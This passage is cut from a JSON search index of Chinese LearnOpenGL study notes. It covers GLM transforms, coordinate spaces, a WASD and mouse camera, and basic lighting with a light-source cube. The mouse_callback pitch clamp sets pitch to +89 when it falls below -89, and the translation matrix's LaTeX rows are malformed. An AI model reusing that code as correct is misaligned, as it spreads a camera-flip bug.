glDrawElements(GL_TRIANGLES, 6, GL_UNSIGNED_INT, 0);\n    [...]\n}\n</code></pre>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_13","title":"\u53d8\u6362","text":""},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_14","title":"\u9f50\u6b21\u5750\u6807\u7cfb\u4e0b\u4eff\u5c04\u53d8\u6362","text":"<p>\u4f7f\u7528\u77e9\u9635\u53ef\u4ee5\u65b9\u4fbf\u3001\u7edf\u4e00\u7684\u5bf9\u7269\u4f53\u8fdb\u884c\u5404\u79cd\u53d8\u6362\u3002</p> <p>\u9f50\u6b21\u5750\u6807\u4e2d\uff0c\u5bf9\u4e8e 3D \u70b9\uff0c\\(w=1\\)\uff1b\u5bf9\u4e8e 3D \u5411\u91cf\uff0c\\(w =0\\)</p> <p>\u5728\u4e8c\u7ef4\u5e73\u9762\u4e0b\uff0c\u7528\u9f50\u6b21\u5750\u6807\u5206\u522b\u8868\u793a\u7f29\u653e\u3001\u65cb\u8f6c\u7684\u77e9\u9635\uff1a</p> <p>Scale\uff1a</p> \\[ S(s_x, s_y)=\\left[\\begin{matrix}s_x &amp; 0 &amp; 0 \\\\ 0 &amp; s_y &amp; 0 \\\\ 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\] <p>Rotate\uff1a</p> \\[ R(\\alpha) = \\left[\\begin{matrix}\\cos \\alpha &amp; -\\sin \\alpha &amp; 0 \\\\ \\sin \\alpha &amp; \\cos \\alpha &amp; 0 \\\\ 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\] <p>Translation\uff1a</p> <p>$$ T(t_x, t_y) =\\left[\\begin{matrix}1 &amp; 0&amp; t_x \\ 0 &amp; 1 &amp; t_y  \\ 0 &amp; 0 &amp; 1\\end{matrix}\\right] $$ </p> <p>OpenGL \u6ca1\u6709\u81ea\u5e26\u7684\u77e9\u9635\u548c\u5411\u91cf\u6570\u5b66\u77e5\u8bc6\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 GLM \u5e93 \u3002\u4f8b\u5982\uff0c\u4ee5\u4e0b\u4ee3\u7801\u5b9e\u73b0\u5c06\u7269\u4f53\u5148\u5c06\u7269\u4f53\u6309\u7167\u65f6\u95f4\u65cb\u8f6c\uff0c\u518d\u53f3\u79fb 0.5\uff0c\u4e0b\u79fb 0.5\uff08\u5230\u53f3\u4e0b\u89d2\uff09\u3002</p> <pre><code>glm::mat4 trans = glm::mat4(1.0f);\ntrans = glm::translate(trans, glm::vec3(0.5f, -0.5f, 0.0f));\ntrans = glm::rotate(trans, (float)glfwGetTime(), glm::vec3(0.0f, 0.0f, 1.0f));\n\nShaderProgram.setMatrix4(\"transform\", glm::value_ptr(trans));\n</code></pre> <p>\u6ce8\u610f\u53d8\u6362\u77e9\u9635\u7684\u5e94\u7528\u662f\u4ece\u53f3\u5230\u5de6\u7684\uff0c\u56e0\u6b64\u540e\u4e58\u7684\u4f1a\u5148\u88ab\u52a0\u8f7d</p>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_15","title":"\u5750\u6807\u7cfb\u53d8\u6362","text":"<p>\u5728\u6211\u4eec\u4e4b\u524d\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u90fd\u662f\u76f4\u63a5\u5c06\u7269\u4f53\u653e\u7f6e\u5728\u6807\u51c6\u5316\u8bbe\u5907\u5750\u6807\u4e4b\u5185\u6765\u6e32\u67d3\uff0c\u8d85\u51fa \\([-1,1]^3\\) \u8303\u56f4\u7684\u7269\u4f53\u90fd\u5c06\u4e0d\u53ef\u89c1\u3002\u5b9e\u9645\u5e94\u7528\u4e2d\uff0c\u6211\u4eec\u9700\u8981\u5c06\u539f\u672c\u7684\u5750\u6807\u7cfb\u8f6c\u6362\u4e3a\u6807\u51c6\u5316\u8bbe\u5907\u5750\u6807\uff0c\u7136\u540e\u5c06\u8f6c\u6362\u540e\u7684\u5750\u6807\u4f20\u5165\u5149\u6805\u5668\uff0c\u518d\u5c06\u5b83\u4eec\u53d8\u4e3a\u5c4f\u5e55\u4e0a\u7684\u4e8c\u7ef4\u5750\u6807\u6216\u50cf\u7d20\u3002</p> <p>\u4e00\u822c\u6765\u8bb2\uff0c\u4ece\u6211\u4eec\u7269\u4f53\u7684\u5c40\u90e8\u5750\u6807\u5230\u6700\u7ec8\u5f97\u5230\u7684\u5c4f\u5e55\u5750\u6807\uff0c\u4f1a\u7ecf\u8fc7\u4ee5\u4e0b\u51e0\u4e2a\u53d8\u6362\u8fc7\u7a0b\uff1a</p> <p></p> <ul> <li>\u5c40\u90e8\u7a7a\u95f4\uff1a \u6307\u7269\u4f53\u6240\u5728\u7684\u5c40\u90e8\u7a7a\u95f4\uff0c\u6bcf\u4e2a\u5c40\u90e8\u7a7a\u95f4\u7684\u5750\u6807\u539f\u70b9\u53c2\u7167\u90fd\u53ef\u80fd\u4e0d\u540c</li> <li>\u4e16\u754c\u7a7a\u95f4\uff1a \u5c06\u5404\u4e2a\u7269\u4f53\u653e\u7f6e\u5728\u4e16\u754c\u5750\u6807\u7cfb\u4e0b\u7684\u7a7a\u95f4\u5750\u6807\uff0c\u901a\u8fc7 Model Matrix \u8f6c\u6362\u5f97\u5230<ul> <li>Model Matrix \u80fd\u591f\u5bf9\u7269\u4f53\u8fdb\u884c\u4f4d\u79fb\u3001\u7f29\u653e\u3001\u65cb\u8f6c\u7b49\u64cd\u4f5c\uff0c\u4f7f\u5176\u6446\u653e\u5728\u6b63\u786e\u7684\u4f4d\u7f6e</li> </ul> </li> <li>\u89c2\u5bdf\u7a7a\u95f4\uff1a \u6709\u65f6\u4e5f\u88ab\u79f0\u4e3a\u6444\u50cf\u673a\u7a7a\u95f4\u6216\u89c6\u89c9\u7a7a\u95f4\uff0c\u662f\u5c06\u4e16\u754c\u5750\u6807\u8f6c\u6362\u6210\u7528\u6237\u89c6\u91ce\u7684\u7ed3\u679c\uff0c\u901a\u8fc7 View Matrix \u8f6c\u6362\u5f97\u5230</li> <li>\u88c1\u526a\u7a7a\u95f4\uff1a \u901a\u8fc7 Projection Matrix \u5c06\u89c2\u5bdf\u7a7a\u95f4\u5185\u7684\u5750\u6807\u8f6c\u6362\u6210\u6807\u51c6\u5316\u8bbe\u5907\u5750\u6807\u3002\u8d85\u51fa \\([-1,1]\\) \u7684\u5185\u5bb9\u5c06\u4f1a\u88ab\u88c1\u526a\u6389<ul> <li>\u5b9e\u9645\u4f7f\u7528\u4e2d\uff0c\u53ef\u4ee5\u9009\u62e9\u6b63\u4ea4\u6295\u5f71(Orthographic)\u6216\u8005\u900f\u89c6\u6295\u5f71(Perspective)</li> <li>\u4e8c\u8005\u533a\u522b\u5728\u4e8e\uff0c\u6b63\u4ea4\u6295\u5f71\u8fdc\u8fd1\u5e73\u9762\u7b49\u5927\uff0c\u800c\u900f\u89c6\u6295\u5f71\u8fd1\u5e73\u9762\u8f83\u5c0f\uff0c\u6444\u50cf\u673a\u88ab\u770b\u4f5c\u662f\u4e00\u4e2a\u70b9</li> </ul> </li> </ul> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 GLM \u5185\u7f6e\u7684\u51fd\u6570\u6765\u521b\u5efa\u6b63\u4ea4\u6295\u5f71\u77e9\u9635\u6216\u8005\u900f\u89c6\u6295\u5f71\u77e9\u9635\uff1a</p> <pre><code>// Orthographic Projection Matrix\nglm::ortho(0.0f, 800.0f, 0.0f, 600.0f, 0.1f, 100.0f);\n- 1.2. \u5de6\u53f3\u5750\u6807\n- 3.4. \u5e95\u90e8\u9876\u90e8\u5750\u6807\n- 5.6. \u8fd1\u5e73\u9762\u8fdc\u5e73\u9762\u5750\u6807\n\n\n// Perspective Projection Matrix\nglm::mat4 proj = glm::perspective(glm::radians(45.0f), (float)width/(float)height, 0.1f, 100.0f);\n- 1. FOV: field of view\n- 2. \u5bbd\u9ad8\u6bd4\n- 3.4. \u8fd1\u5e73\u9762\u8fdc\u5e73\u9762\u5750\u6807 \n</code></pre> <p>\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5bf9\u7269\u4f53\u5750\u6807\u505a\u51fa\u5982\u4e0b\u53d8\u6362\uff0c\u4f7f\u5f97\uff0c\u5176\u89c6\u89c9\u6548\u679c\u5c31\u50cf\u5728\u5730\u677f\u4e0a\u4e00\u6837\uff1a</p> <pre><code>/** in shader.vs:\ngl_Position = projection * view * model * vec4(aPos, 1.0f);\n*/\n\nglm::mat4 model = glm::mat4(1.0f);\nmodel = glm::rotate(model, glm::radians(-55.0f), glm::vec3(1.0f, 0.0f, 0.0f));\nglm::mat4 view = glm::mat4(1.0f);\nview = glm::translate(view, glm::vec3(0.0f, 0.0f, -3.0f));\nglm::mat4 projection = glm::mat4(1.0f);\nprojection = glm::perspective(glm::radians(45.0f), 800.0f / 600.0f, 0.1f, 100.0f);\n\nShaderProgram.setMatrix4(\"model\", glm::value_ptr(model));\nShaderProgram.setMatrix4(\"view\", glm::value_ptr(view));\nShaderProgram.setMatrix4(\"projection\", glm::value_ptr(projection));\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u5c06\u4f7f\u7528 3D \u7269\u4f53 \u6765\u505a\u6f14\u793a\u3002</p> <p>\u6b64\u5904\u4e0d\u91c7\u7528\u7d22\u5f15\u7f13\u51b2\uff0c\u76f4\u63a5\u4f7f\u7528 <code>glDrawArrays</code> \u753b\u51fa 12 \u4e2a\u4e09\u89d2\u5f62\uff1a</p> <pre><code>// \u5f00\u542f z \u7f13\u51b2\uff0c\u4f46\u9700\u8981\u5728\u6bcf\u6b21\u5faa\u73af\u5f00\u5934\u6e05\u7a7a buffer\nglEnable(GL_DEPTH_TEST); // \u4f4d\u4e8e\u7b2c\u4e00\u6b21\u7740\u8272\u5668\u7a0b\u5e8f\u5bf9\u8c61\u542f\u7528\u4e4b\u524d\n\n\n// in render loop:\nglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); // \u6e05\u7a7a\u989c\u8272\u7f13\u51b2\u548c\u6df1\u5ea6\u7f13\u51b2\n\nglm::mat4 view = glm::mat4(1.0f);\nview = glm::translate(view, glm::vec3(-xoffset, -yoffset, -3.0f));\nglm::mat4 projection = glm::mat4(1.0f);\nprojection = glm::perspective(glm::radians(45.0f), 800.0f / 600.0f, 0.1f, 100.0f);\n\nShaderProgram.setMatrix4(\"view\", glm::value_ptr(view));\nShaderProgram.setMatrix4(\"projection\", glm::value_ptr(projection));\n\nShaderProgram.use();\nglBindVertexArray(VAO);\nfor (unsigned int i = 0; i &lt; 10; i++)\n{\n    glm::mat4 model = glm::mat4(1.0f);\n    model = glm::translate(model, cubePositions[i]);\n    model = glm::rotate(model, (float)glfwGetTime(), glm::vec3(1.0f, 0.3f, 0.5f));\n    ShaderProgram.setMatrix4(\"model\", glm::value_ptr(model));\n\n    glDrawArrays(GL_TRIANGLES, 0, 36);\n}\n</code></pre> <p>\u4e00\u6b21\u5faa\u73af\u6e32\u67d3\u5341\u4e2a\u7bb1\u5b50\uff0c\u7bb1\u5b50\u7684\u4e16\u754c\u5750\u6807\u504f\u79fb\u7531\u6570\u7ec4 <code>cubePositions</code> \u786e\u5b9a\u3002</p>"},{"location":"Accumulation/LearnOpenGL/1.%E5%85%A5%E9%97%A8/#_16","title":"\u6444\u50cf\u673a","text":"<p>OpenGL \u672c\u8eab\u6ca1\u6709\u6444\u50cf\u673a\u7684\u6982\u5ff5\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u628a\u573a\u666f\u4e2d\u7684\u6240\u6709\u7269\u4f53\u90fd\u5f80\u76f8\u53cd\u65b9\u5411\u79fb\u52a8\u6765\u6a21\u62df\u6444\u50cf\u673a\u7684\u79fb\u52a8\u3002</p> <p>\u90a3\u4e48 View Matrix \u7684\u4f5c\u7528\u5c31\u662f\u5c06\u4e16\u754c\u5750\u6807\u53d8\u6362\u4e3a\u4ee5\u6444\u50cf\u673a\u4e3a\u539f\u70b9\u7684\u65b0\u5750\u6807\u7cfb\u3002\u6240\u5e78\u7684\u662f\uff0cGLM \u63d0\u4f9b\u4e86\u4e00\u79cd\u4fbf\u5229\u7684\u65b9\u5f0f\u751f\u6210\u8be5\u53d8\u6362\u77e9\u9635\uff1a</p> <pre><code>glm::mat4 view;\nview = glm::lookAt(glm::vec3(0.0f, 0.0f, 3.0f), \n           glm::vec3(0.0f, 0.0f, 0.0f), \n           glm::vec3(0.0f, 1.0f, 0.0f));\n</code></pre> <ul> <li>\u53c2\u6570\u4e00\uff1a \u6444\u50cf\u673a\u5750\u6807</li> <li>\u53c2\u6570\u4e8c\uff1a \u770b\u5411\u76ee\u6807\u7684\u5750\u6807</li> <li>\u53c2\u6570\u4e09\uff1a \u6444\u50cf\u673a\u7684\u4e0a\u5411\u91cf\uff0c\u7528\u6765\u786e\u5b9a\u89c6\u89d2\u65b9\u5411</li> </ul> <p>\u636e\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528 <code>glfwGetTime</code> \u51fd\u6570\u6765\u641e\u4e00\u70b9\u82b1\u6837\uff1a</p> <pre><code>float radius = 10.0f;\nfloat camX = sin(glfwGetTime()) * radius;\nfloat camZ = cos(glfwGetTime()) * radius;\nglm::mat4 view;\nview = glm::lookAt(glm::vec3(camX, 0.0, camZ), glm::vec3(0.0, 0.0, 0.0), glm::vec3(0.0, 1.0, 0.0)); \n</code></pre> <p></p> <p>\u6211\u4eec\u5f53\u7136\u53ef\u4ee5\u4f7f\u7528\u952e\u76d8\u9f20\u6807\u7b49\u8f93\u5165\u81ea\u7531\u64cd\u63a7\u6444\u50cf\u673a\u7684\u79fb\u52a8\uff0c\u4e3a\u4e86\u7b80\u5316\u6b65\u9aa4\uff0c\u6211\u4eec\u5b9a\u4e49\u5982\u4e0b\u51e0\u4e2a\u6444\u50cf\u673a\u5411\u91cf\uff1a</p> <pre><code>glm::vec3 cameraPos   = glm::vec3(0.0f, 0.0f,  3.0f);\nglm::vec3 cameraFront = glm::vec3(0.0f, 0.0f, -1.0f); // \u6444\u50cf\u673a\u65b9\u5411\nglm::vec3 cameraUp    = glm::vec3(0.0f, 1.0f,  0.0f);\n\nview = glm::lookAt(cameraPos, cameraPos + cameraFront, cameraUp);\n</code></pre> <p>\u4f7f\u7528 <code>cameraFront</code> \u786e\u5b9a\u65b9\u5411\uff0c\u8fd9\u6837\u5c31\u7b97\u4fee\u6539 <code>cameraPos</code>\uff0c\u89c6\u89d2\u65b9\u5411\u4e5f\u4e0d\u4f1a\u53d8</p> <p>\u5728 <code>processInput</code> \u51fd\u6570\u4e2d\uff0c\u6211\u4eec\u6dfb\u52a0\u6309\u952e\u547d\u4ee4\u5b9e\u73b0 wasd \u63a7\u5236\u6444\u50cf\u673a\uff1a</p> <pre><code>void processInput(GLFWwindow *window)\n{\n    ...\n    float cameraSpeed = 2.5f * deltaTime;\n    if (glfwGetKey(window, GLFW_KEY_W) == GLFW_PRESS)\n        cameraPos += cameraSpeed * cameraFront;\n    if (glfwGetKey(window, GLFW_KEY_S) == GLFW_PRESS)\n        cameraPos -= cameraSpeed * cameraFront;\n    if (glfwGetKey(window, GLFW_KEY_A) == GLFW_PRESS)\n        cameraPos -= glm::normalize(glm::cross(cameraFront, cameraUp)) * cameraSpeed;\n    if (glfwGetKey(window, GLFW_KEY_D) == GLFW_PRESS)\n        cameraPos += glm::normalize(glm::cross(cameraFront, cameraUp)) * cameraSpeed;\n}\n</code></pre> <p>deltaTime</p> <p>\u7531\u4e8e\u4e0d\u540c\u7528\u6237\u8bbe\u5907\u539f\u56e0\uff0c\u6bcf\u79d2\u6e32\u67d3\u7684\u5e27\u6570\u53ef\u80fd\u4e0d\u4e00\u81f4\uff0c\u5bfc\u81f4 <code>processInput</code> \u6bcf\u79d2\u8c03\u7528\u7684\u6b21\u6570\u4e5f\u4e0d\u540c\u3002\u4e3a\u4e86\u8ba9\u6240\u6709\u7528\u6237\u7684\u6444\u50cf\u673a\u79fb\u52a8\u901f\u5ea6\u76f8\u540c\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528 \\(\\Delta T\\) \u6765\u4f5c\u4e3a\u76f8\u673a\u79fb\u52a8\u901f\u5ea6\u7684\u91cf\u5ea6\u3002</p> <pre><code>// in render loop\nfloat currentFrame = glfwGetTime();\ndeltaTime = currentFrame - lastFrame;\nlastFrame = currentFrame;\n</code></pre> <p>\u53ea\u7528\u952e\u76d8\u64cd\u63a7\u8fd8\u4e0d\u591f\u6709\u610f\u601d\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u52a0\u5165\u9f20\u6807\u63a7\u5236\uff0c\u5b9e\u73b0\u7c7b\u4f3c FPS \u6e38\u620f\u7684\u6548\u679c\uff01</p> <p>\u6211\u4eec\u7528\u6b27\u62c9\u89d2\u8868\u793a 3D \u7a7a\u95f4\u4e2d\u7684\u4e09\u4e2a\u65cb\u8f6c\u503c\uff1a</p> <p></p> <ul> <li>\u4fef\u4ef0\u89d2 Pitch\uff1a \u63cf\u8ff0\u5982\u4f55\u5411\u4e0a\u6216\u5411\u4e0b\u770b\uff0c\u5e73\u9762\u4e0e y \u8f74\u5e73\u884c</li> <li>\u504f\u822a\u89d2 Yaw\uff1a \u63cf\u8ff0\u5982\u4f55\u5411\u5de6\u6216\u5411\u53f3\u770b\uff0c\u5e73\u9762\u4e0e y \u8f74\u5782\u76f4<ul> <li>\u5176\u5927\u5c0f\u4e3a\u4e0e x \u8f74\u7684\u5939\u89d2</li> </ul> </li> <li>\u6eda\u8f6c\u89d2 Roll\uff1a \u63cf\u8ff0\u6444\u50cf\u673a\u5982\u4f55\u7ffb\u6eda\uff0c\u5e73\u9762\u4e0e z \u8f74\u5782\u76f4</li> </ul> <p>\u6b64\u5904\u6211\u4eec\u53ea\u9700\u5173\u5fc3 Pitch \u548c Yaw \u7684\u5904\u7406\uff0c\u6839\u636e\u4e09\u89d2\u5b66\u7684\u77e5\u8bc6\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5bf9\u4e8e\u5355\u4f4d\u65b9\u5411\u5411\u91cf\uff0c\u5176 xyz \u5206\u91cf\u4e3a\uff1a</p> <pre><code>direction.x = cos(glm::radians(pitch)) * cos(glm::radians(yaw));\ndirection.y = sin(glm::radians(pitch));\ndirection.z = cos(glm::radians(pitch)) * sin(glm::radians(yaw));\n</code></pre> <p>Pitch \u548c Yaw \u53ef\u4ee5\u4ece\u4e0a\u4e00\u5e27\u9f20\u6807\u7684\u4f4d\u7f6e\u548c\u8fd9\u4e00\u5e27\u9f20\u6807\u4f4d\u7f6e\u7684\u6bd4\u5bf9\u5f97\u5230\u3002\u6211\u4eec\u9996\u5148\u5e94\u8be5\u544a\u8bc9 GLFW \u6211\u4eec\u9700\u8981\u6355\u83b7\u9f20\u6807\uff0c\u8be5\u64cd\u4f5c\u4ecd\u7136\u901a\u8fc7\u51fd\u6570\u8bbe\u7f6e\u72b6\u6001\u673a\u5b8c\u6210\uff1a</p> <pre><code>glfwSetInputMode(window, GLFW_CURSOR, GLFW_CURSOR_DISABLED);\n</code></pre> <p>\u4e3a\u4e86\u76d1\u542c\u9f20\u6807\u4f4d\u7f6e\uff0c\u6211\u4eec\u989d\u5916\u8bbe\u7f6e\u4e00\u4e2a\u56de\u8c03\u51fd\u6570 <code>mouse_callback</code> \uff0c\u6bcf\u5f53\u9f20\u6807\u88ab\u79fb\u52a8\u65f6\u90fd\u4f1a\u8c03\u7528\u8be5\u51fd\u6570\uff1a</p> <pre><code>glfwSetCursorPosCallback(window, mouse_callback);\n\n// xpox, ypos \u4e3a\u5f53\u524d\u9f20\u6807\u4f4d\u7f6e\nvoid mouse_callback(GLFWwindow* window, double xpos, double ypos)\n{\n    if(firstMouse) // \u8fd9\u4e2abool\u53d8\u91cf\u521d\u59cb\u65f6\u662f\u8bbe\u5b9a\u4e3atrue\u7684\n    {\n        lastX = xpos;\n        lastY = ypos;\n        firstMouse = false;\n        return;\n    }\n\n    float xoffset = xpos - lastX;\n    float yoffset = lastY - ypos; // \u9f20\u6807\u5411\u4e0a\u79fb\u52a8\uff0cypos \u51cf\u5c0f\n    lastX = xpos;\n    lastY = ypos;\n\n    float sensitivity = 0.05f; // \u7075\u654f\u5ea6\n    xoffset *= sensitivity;\n    yoffset *= sensitivity;\n\n    yaw += xoffset;\n    pitch += yoffset;\n\n    if (pitch &gt; 89.0f)\n        pitch = 89.0f;\n    if (pitch &lt; -89.0f)\n        pitch = 89.0f;\n\n    glm::vec3 front;\n    front.x = cos(glm::radians(pitch)) * cos(glm::radians(yaw));\n    front.y = sin(glm::radians(pitch));\n    front.z = cos(glm::radians(pitch)) * sin(glm::radians(yaw));\n    cameraFront = glm::normalize(front);\n}\n</code></pre>"},{"location":"Accumulation/LearnOpenGL/2.%E5%85%89%E7%85%A7/","title":"2. \u5149\u7167","text":""},{"location":"Accumulation/LearnOpenGL/2.%E5%85%89%E7%85%A7/#2","title":"2. \u5149\u7167","text":"<p> \u7ea6 2344 \u4e2a\u5b57  358 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 16 \u5206\u949f</p>"},{"location":"Accumulation/LearnOpenGL/2.%E5%85%89%E7%85%A7/#_1","title":"\u57fa\u7840\u5149\u7167","text":""},{"location":"Accumulation/LearnOpenGL/2.%E5%85%89%E7%85%A7/#_2","title":"\u989c\u8272","text":"<p>\u73b0\u5b9e\u751f\u6d3b\u4e2d\u7684\u7269\u4f53\u989c\u8272\u7531\u8be5\u7269\u4f53\u8868\u9762\u53cd\u5c04\u7684\u5149\u7ebf\u51b3\u5b9a\u3002\u4e4b\u524d\u7684\u4f8b\u5b50\u4e2d\u6211\u4eec\u90fd\u9ed8\u8ba4\u7167\u5c04\u5149\u6e90\u4e3a\u767d\u5149\uff0c\u5b83\u5305\u542b\u6240\u6709\u7684\u989c\u8272\u503c\u3002</p> <p>\u5728\u56fe\u5f62\u5b66\u4e0a\uff0c\u5149\u7684\u53cd\u5c04\u5b9a\u5f8b\u51b3\u5b9a\u7684\u989c\u8272\u503c\u53ef\u4ee5\u5f88\u7b80\u5355\u5730\u5199\u4f5c\uff1a</p> <pre><code>glm::vec3 lightColor(1.0f, 1.0f, 1.0f); // \u5149\u6e90\u989c\u8272\uff0c\u6b64\u5904\u662f\u767d\u5149\nglm::vec3 toyColor(1.0f, 0.5f, 0.31f); // \u7269\u4f53\u989c\u8272\uff0c\u6b64\u5904\u662f\u73ca\u745a\u7ea2\nglm::vec3 result = lightColor * toyColor; // = (1.0f, 0.5f, 0.31f);\n</code></pre> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u4fee\u6539\u7247\u6bb5\u7740\u8272\u5668\uff0c\u4f7f\u5176\u6700\u7ec8\u8f93\u51fa\u7684\u989c\u8272\u7b26\u5408\u8fd9\u4e2a\u5b9a\u5f8b\uff1a</p> <pre><code>#version 330 core\n\nout vec4 FragColor;\n\nuniform vec3 lightcolor; // \u5149\u6e90\u989c\u8272\nuniform vec3 objectcolor; // \u7269\u4f53\u989c\u8272\n\n// \u900f\u660e\u5ea6\nuniform float alpha = 1.0;\n\nvoid main()\n{\n    FragColor = vec4(lightcolor * objectcolor, alpha);\n}\n</code></pre> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u6253\u7b97\u521b\u5efa\u4e00\u4e2a\u53ef\u89c1\u7684\u5149\u6e90\uff0c\u4e3a\u4e86\u4fbf\u4e8e\u5bf9\u5149\u6e90\u8fdb\u884c\u8c03\u6574\uff0c\u6211\u4eec\u4e3a\u5176\u8bbe\u7f6e\u4e00\u4e2a\u5355\u72ec\u7684 VAO\uff08VBO \u548c\u7269\u4f53\u76f8\u540c\uff0c\u56e0\u4e3a\u6211\u4eec\u6253\u7b97\u7528\u4e00\u4e2a\u8f83\u5c0f\u7684\u7bb1\u5b50\u4ee3\u66ff\u5149\u6e90\uff09\uff1a</p> <pre><code>    Shader ShaderProgram(\"shader/light/shader.vs\", \"shader/light/shader.fs\");\n    ShaderProgram.use();\n\n    ShaderProgram.setVec3(\"objectcolor\", 1.0f, 0.5f, 0.31f); // \u7269\u4f53\u4e3a\u6a59\u8272\n    ShaderProgram.setVec3(\"lightcolor\", 1.0f, 1.0f, 1.0f); // \u5149\u6e90\u662f\u767d\u8272\u7684\n\n    // \u8c03\u6574\u7269\u4f53\u7684\u9876\u70b9\u6570\u636e\n    glBindVertexArray(VAO);\n    // \u628a\u9876\u70b9\u6570\u7ec4\u590d\u5236\u5230\u7f13\u51b2\u4e2d\u4f9bOpenGL\u4f7f\u7528\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glBufferData(GL_ARRAY_BUFFER, sizeof(vertices), vertices, GL_STATIC_DRAW);\n    // \u8bbe\u7f6e\u9876\u70b9\u5c5e\u6027\u6307\u9488\n    // position attribute\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(float), (void*)0);\n    glEnableVertexAttribArray(0);\n\n    Shader LightShader = Shader(\"shader/light/shader.vs\", \"shader/light/lightshader.fs\");\n    LightShader.use();\n\n    // \u8c03\u6574\u5149\u6e90\u7684\u9876\u70b9\u6570\u636e\n    glBindVertexArray(lightVAO);\n    glBindBuffer(GL_ARRAY_BUFFER, VBO);\n    glVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 3 * sizeof(float), (void*)0);\n    glEnableVertexAttribArray(0);\n</code></pre> \u672c\u4f8b\u7684\u9876\u70b9\u6570\u636e\uff0c\u4e3a\u4e00\u4e2a\u7bb1\u5b50 <pre><code>    float vertices[] = {\n    -0.5f, -0.5f, -0.5f,\n     0.5f, -0.5f, -0.5f,\n     0.5f,  0.5f, -0.5f,\n     0.5f,  0.5f, -0.5f,\n    -0.5f,  0.5f, -0.5f,\n    -0.5f, -0.5f, -0.5f,\n    -0.5f, -0.5f,  0.5f,\n     0.5f, -0.5f,  0.5f,\n     0.5f,  0.5f,  0.5f,\n     0.5f,  0.5f,  0.5f,\n    -0.5f,  0.5f,  0.5f,\n    -0.5f, -0.5f,  0.5f,\n    -0.5f,  0.5f,  0.5f,\n    -0.5f,  0.5f, -0.5f,\n    -0.5f, -0.5f, -0.5f,\n    -0.5f, -0.5f, -0.5f,\n    -0.5f, -0.5f,  0.5f,\n    -0.5f,  0.5f,  0.5f,\n     0.5f,  0.5f,  0.5f,\n     0.5f,  0.5f, -0.5f,\n     0.5f, -0.5f, -0.5f,\n     0.5f, -0.5f, -0.5f,\n     0.5f, -0.5f,  0.5f,\n     0.5f,  0.5f,  0.5f,\n    -0.5f, -0.5f, -0.5f,\n     0.5f, -0.5f, -0.5f,\n     0.5f, -0.5f,  0.5f,\n     0.5f, -0.5f,  0.5f,\n    -0.5f, -0.5f,  0.5f,\n    -0.5f, -0.5f, -0.5f,\n    -0.5f,  0.5f, -0.5f,\n     0.5f,  0.5f, -0.5f,\n     0.5f,  0.5f,  0.5f,\n     0.5f,  0.5f,  0.5f,\n    -0.5f,  0.5f,  0.5f,\n    -0.5f,  0.5f, -0.5f,\n};\n</code></pre> <p>\u5728\u6e32\u67d3\u5faa\u73af\u4e2d\uff0c\u6211\u4eec\u6bcf\u5e27\u90fd\u5bf9\u7269\u4f53\u548c\u5149\u6e90\u5e94\u7528\u4e0d\u540c\u7684\u53d8\u6362\u77e9\u9635\uff1a</p> <pre><code>// in render loop:\n// \u7269\u4f53\nShaderProgram.use();\n\nglm::mat4 view = glm::mat4(1.0f);\nview = camera.GetViewMatrix();\nglm::mat4 projection = glm::perspective(glm::radians(camera.Zoom), (float)SCR_WIDTH / (float)SCR_HEIGHT, 0.1f, 100.0f);\n\n// ShaderProgram.setMatrix4(\"model\", glm::value_ptr(model));\nShaderProgram.setMatrix4(\"view\", glm::value_ptr(view));\nShaderProgram.setMatrix4(\"projection\", glm::value_ptr(projection));\n\nShaderProgram.setFloat(\"alpha\", 1.0);\nglm::mat4 model = glm::mat4(1.0f);\nShaderProgram.setMatrix4(\"model\", glm::value_ptr(model));\nglBindVertexArray(VAO);\nglDrawArrays(GL_TRIANGLES, 0, 36);\n\n// \u5149\u6e90\nLightShader.use();\nLightShader.setMatrix4(\"view\", glm::value_ptr(view));\nLightShader.setMatrix4(\"projection\", glm::value_ptr(projection));\nmodel = glm::mat4(1.0f);\nmodel = glm::translate(model, lightPos);\nmodel = glm::scale(model, glm::vec3(0.2f)); // a smaller cube\nLightShader.setMatrix4(\"model\", glm::value_ptr(model));\nglBindVertexArray(lightVAO);\nglDrawArrays(GL_TRIANGLES, 0, 36);\n</code></pre> <p>\u7406\u60f3\u7684\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"Accumulation/LearnOpenGL/2.%E5%85%89%E7%85%A7/#_3","title":"\u5149\u7167\u6a21\u578b","text":"<p>\u5149\u7167\u6a21\u578b\u57fa\u4e8e\u6211\u4eec\u5bf9\u73b0\u5b9e\u4e2d\u7684\u5149\u7684\u7406\u89e3\uff0c\u4f8b\u5982\uff0cPhong Lighting Model \u5c06\u5149\u5206\u4e3a\u4e09\u4e2a\u5206\u91cf\uff1a</p> <p></p> <ul> <li>\u73af\u5883\u5149\u7167 ambient\uff1a \u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u73af\u5883\u5149\u7167\u5e38\u91cf\uff0c\u5b83\u4f1a\u6c38\u8fdc\u7ed9\u7269\u4f53\u4e00\u4e9b\u989c\u8272</li> <li>\u6f2b\u53cd\u5c04 diffuse\uff1a 